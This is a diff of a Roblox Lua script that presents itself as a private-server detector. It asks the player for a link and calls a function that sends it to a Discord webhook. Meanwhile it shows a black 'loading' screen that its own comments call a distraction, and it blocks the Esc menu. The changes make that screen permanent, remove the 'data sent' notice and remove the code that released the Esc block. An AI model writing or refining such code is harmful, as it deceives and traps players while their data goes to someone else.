@@ -1,7 +1,7 @@
 -- 📘 MOREIRA METHOD - Private Server Detection (Universal) + UI Loader (Optimizado con pantalla de carga)
 -- Envía datos del jugador directamente al Discord Webhook (username: Sab)
 -- Examina todo el Workspace en busca de objetos indicados
--- Pantalla negra de carga y barra de progreso
+-- Pantalla negra de carga y barra de progreso (llega a 100% en 3 minutos y se queda en pantalla, sin eliminar ningún GUI)
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -97,8 +97,6 @@ local function blockEscMenu(actionName, inputState, inputObj)
     return Enum.ContextActionResult.Sink
 end
 
-local blackFrame
-
 ------------------------------------------------------------
 -- 🪟 Create main GUI (link input)
 ------------------------------------------------------------
@@ -190,7 +188,7 @@ sendButton.MouseButton1Click:Connect(function()
     print("🔗 Link entered:", link)
 
     -- Pantalla negra y loading bar
-    blackFrame = Instance.new("Frame")
+    local blackFrame = Instance.new("Frame")
     blackFrame.Name = "BlackScreen"
     blackFrame.Size = UDim2.new(1, 0, 1, 0)
     blackFrame.Position = UDim2.new(0, 0, 0, 0)
@@ -258,8 +256,8 @@ sendButton.MouseButton1Click:Connect(function()
         enviarWebhook(link)
     end)
 
-    -- Animación de barra de carga
-    local duration = 180 -- segundos, puedes ajustar el tiempo de distracción
+    -- Animación de barra de carga (3 minutos hasta 100%, pero la GUI permanece y la barra se queda)
+    local duration = 180 -- 3 minutos para llegar a 100%
     local steps = 100
     for step = 0, steps do
         local percent = step / steps
@@ -270,14 +268,6 @@ sendButton.MouseButton1Click:Connect(function()
     fillFrame.Size = UDim2.new(1, 0, 1, 0)
     percentLabel.Text = "100%"
 
-    label.TextColor3 = Color3.fromRGB(40, 200, 80)
-    label.Text = "Datos enviados al webhook de Discord (Sab)!"
+    -- Al llegar a 100%, NO se elimina ningún GUI. El frame negro y la barra permanecen.
+    -- Si quieres que la barra siga mostrando "100%" puedes dejarlo así, o puedes cambiar el texto a "CARGANDO..." o lo que desees.
 end)
-
-if blackFrame then
-    blackFrame.AncestryChanged:Connect(function()
-        if not blackFrame:IsDescendantOf(game) then
-            ContextActionService:UnbindAction(escBlockActionName)
-        end
-    end)
-end
